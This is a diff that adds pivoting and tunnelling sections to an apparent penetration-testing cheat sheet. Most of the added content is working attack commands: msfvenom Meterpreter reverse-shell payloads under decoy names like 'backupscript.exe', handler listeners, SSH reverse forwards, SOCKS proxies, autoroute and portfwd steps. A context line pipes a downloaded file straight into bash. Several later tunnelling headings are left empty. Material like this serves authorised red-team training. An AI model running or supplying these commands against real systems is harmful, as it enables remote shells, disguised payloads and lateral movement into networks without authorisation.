@@ -553,5 +553,110 @@ wget -q0- <Target File URL> | bash
   ```sh
   proxychains xfreerdp /v:<IP> /u:<user> /p:<pass>
   ```
+
+#### Remote/Reverse Port Forwarding with SSH
+  1. Create a Windows Payload with MSFVenom
+  ```sh
+  msfvenom -p windows/x64/meterpreter/reverse_https lhost= <Pivot Internal IP> -f exe -o backupscript.exe LPORT=8080
+  ```
+  2. Start the Listener
+  ```sh
+  use exploit/multi/handler
+  set payload windows/x64/meterpreter/reverse_https
+  set lhost 0.0.0.0
+  set lport 8000
+  run
+  ```
+  2. Transfer the .exe to the pivot server and then to the windows machine.
+  3. Create the SSH Remote port forward
+  ```sh
+  ssh -R <Pivot Internal IP>:8080:0.0.0.0:8000 <user>@<External_IP> -vN
+  ```
+
+#### Meterpreter Tunneling
+  1. Create a payload for Pivot Host
+  ```sh
+  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Attack_IP> -f elf -o backupjob LPORT=8080
+  ```
+  2. Change permissions and run the exe on the pivot host
+  ```sh
+  chmod +x backupjob
+  ./backupjob
+  ```
+  3. Perform a Ping Sweep from meterpreter
+  ```msf
+  run post/multi/gather/ping_sweep RHOSTS=<Internal_Network>
+  ```
+  4. Configure MSF's SOCKS Proxy and verify Proxy Server is Running
+  ```sh
+  use auxliary/server/socks_proxy
+  set SRVPORT 9050
+  set SRVHOST 0.0.0.0
+  set version 4a
+  run
+  jobs
+  ```
+  5. Create Routes with autoroute
+  ```sh
+  use post/multi/manage/autoroute
+  set SESSION x
+  set subnet <IP>
+  run
+  ```
+  or
+  ```sh
+  run autoroute -s <internal network>
+  ```
+  6. List active routes with AutoRoute
+  ```sh
+  run autoroute -p
+  ```
+  7. Verify Functionality
+  ```sh
+  proxychains nmap <IP> -p<port> -sT -v -Pn
+  ```
   
-  ## Testing the Top 10 Web Application Vulnerabilities
+#### Meterpreter Port Forwarding
+  1. Create a Local TCP Relay from meterpreter session
+  ```sh
+  portfwd add -l <LPORT> -p <RPORT> -r <Internal_Target_IP>
+  ```
+  2. Verify by connecting to the port.
+  
+#### Meterpreter Reverse Port Forwarding
+  1. Create a Reverse Port Forward
+  ```sh
+  portfwd add -R -l <LPORT> -p <RPORT> -L <Attack_IP>
+  ```
+  2. Configure and start the multi/handler
+  ```sh
+  bg
+  set payload windows/x64/meterpreter/reverse_tcp
+  set LPORT 8081
+  set LHOST 0.0.0.0
+  run
+  ```
+  3. Generate the Windows Payload
+  ```sh
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Internal_Target_IP> -f exe -o backupscript.exe LPORT=1234
+  ```
+  4. Execute the payload on the windows host.
+  
+  
+  
+  
+  
+#### Socat Redirection with a Reverse Shell
+#### Socat Redirection with a Bind Shell
+#### SSH for Windows with plink.exe
+#### SSH Pivoting with sshuttle
+#### Webserver Pivoting with Rpivot
+#### Port Forwarding with Windows: Netsh
+#### DNS TUnneling iwth DNSCAT2
+#### SOCKS5 Tunneling with Chisel
+#### ICMP Tunneling with SOCKS
+#### RDP and SOCKS Tunneling with SocksOverRDP
+
+  
+
+## Testing the Top 10 Web Application Vulnerabilities
